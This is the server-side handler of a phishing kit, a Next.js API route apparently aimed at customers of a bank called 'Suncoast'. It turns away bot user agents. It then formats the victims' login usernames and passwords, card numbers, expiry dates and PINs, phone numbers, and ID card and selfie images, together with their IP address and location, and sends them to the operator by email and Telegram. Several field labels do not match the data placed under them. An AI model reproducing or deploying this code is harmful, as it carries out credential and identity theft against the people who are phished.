import geoip from "geoip-lite";
import MobileDetect from "mobile-detect";
import nextConnect from "next-connect";
import { NextApiRequest, NextApiResponse } from "next";
import middleware from "../../middleware/middleware";
import { sendEmail } from "../../utils/sendEmail";
import { sendTelegram } from "../../utils/sendTelegram";

interface ExtendedRequest extends NextApiRequest {
  files: any;
}

const handler = nextConnect();
handler.use(middleware);

handler.post(async (req: ExtendedRequest, res: NextApiResponse) => {
  const md = new MobileDetect(req.headers[`user-agent`] as string);
  const isBot = md.is(`Bot`);
  if (isBot) {
    res.send(`Fuck off`);
    return;
  }

  try {
    const ip = req.headers[`x-forwarded-for`] || req.connection.remoteAddress;
    const geo = geoip.lookup(ip as string | number);

    const front = req.files && (req.files.front as any);
    const back = req.files && (req.files.back as any);
    const selfie = req.files && (req.files.selfie as any);
    const values = req.body;
    const message = `

<div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄BEGIN⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
<h3><strong>SESSION</strong></h3>
<div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>

<h4>LOGIN DETAILS</h4>
<p>| (▰˘◡˘▰) LOGIN ATTEMPT ☞ <b>${
      JSON.parse(values.logins[0])[`1`].loginDetails.loginAttempt
    }</b></p>
<p>| (▰˘◡˘▰) EMAIL/PHONE NUMBER ☞ <b>${
      JSON.parse(values.logins[0])[`1`].loginDetails.username
    }</b></p>
<p>| (▰˘◡˘▰) PASSWORD ☞ <b>${
      JSON.parse(values.logins[0])[`1`].loginDetails.password
    }</b></p>

${
  JSON.parse(values.logins[0])[`2`]
    ? `<p>| (▰˘◡˘▰) LOGIN ATTEMPT ☞ <b>${
        JSON.parse(values.logins[0])[`2`].loginDetails.loginAttempt
      }</b></p>
<p>| (▰˘◡˘▰) EMAIL/PHONE NUMBER ☞ <b>${
        JSON.parse(values.logins[0])[`2`].loginDetails.username
      }</b></p>
<p>| (▰˘◡˘▰) PASSWORD ☞ <b>${
        JSON.parse(values.logins[0])[`2`].loginDetails.password
      }</b></p>

`
    : ``
}
${
  values.infos
    ? `<div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>

<h4>INFOS</h4>
<p>| (▰˘◡˘▰) FIRST NAME ☞ <b>${JSON.parse(values.infos[0]).fullname}</b></p>
<p>| (▰˘◡˘▰) LAST NAME ☞ <b>${JSON.parse(values.infos[0]).address}</b></p>
<p>| (▰˘◡˘▰) SSN ☞ <b>${JSON.parse(values.infos[0]).zipCode}</b></p>
<p>| (▰˘◡˘▰) DOB ☞ <b>${JSON.parse(values.infos[0]).cardNumber}</b></p>
<p>| (▰˘◡˘▰) STREET ADDRESS ☞ <b>${
        JSON.parse(values.infos[0]).expirationDate
      }</b></p>

`
    : ``
}
${
  values.secure
    ? `<div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>

<h4>${values.secure[0].form}</h4>
<p>| (▰˘◡˘▰) PASSWORD ☞ <b>${JSON.parse(values.secure[0]).password}</b></p>
<p>| (▰˘◡˘▰) PHONE NUMBER ☞ <b>${
        JSON.parse(values.secure[0]).phoneNumber
      }</b></B></p>
<p>| (▰˘◡˘▰) CARD PIN ☞ <b>${JSON.parse(values.secure[0]).cardPin}</b></p>

`
    : ``
}
<div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>

<p>| (▰˘◡˘▰) IP ☞ <b>${ip}</b></p>
<p>| (▰˘◡˘▰) LOCATION ☞ <b>${geo?.city}, ${geo?.country}</b></p>
<p>| (▰˘◡˘▰) TIMEZONE ☞ <b>${geo?.timezone}</b></p>
<p>| (▰˘◡˘▰) USER AGENT ☞ <b>${req.headers[`user-agent`]}</b></p>

<div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄END⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
`;

    if (process.env.TO) {
      await sendEmail(
        message,
        `SUNCOAST - ${values.form} by ROCKET 🚀🚀🚀 From ${ip}`,
        req.files && (front || back)
          ? [
              {
                filename: `Front.${
                  front[0].headers[`content-type`].split(`/`)[1]
                }`,
                content: front[0],
              },
              {
                filename: `Back.${
                  back[0].headers[`content-type`].split(`/`)[1]
                }`,
                content: back[0],
              },
              ...(selfie
                ? [
                    {
                      filename: `Selfie.${
                        selfie[0].headers[`content-type`].split(`/`)[1]
                      }`,
                      content: selfie[0],
                    },
                  ]
                : []),
            ]
          : []
      );
    }

    if (process.env.TELEGRAM_ID) {
      await sendTelegram({
        message: `
        SUNCOAST - ${values.form} by ROCKET 🚀🚀🚀 From ${ip}
        ${message}
      `,
        medias:
          req.files && (front || back)
            ? [front[0], back[0], ...(selfie ? [selfie[0]] : [])]
            : undefined,
      });
    }
  } catch (error) {
    console.log(error);
  }

  res.send(`OK`);
});

export const config = {
  api: {
    bodyParser: false,
  },
};

export default handler;
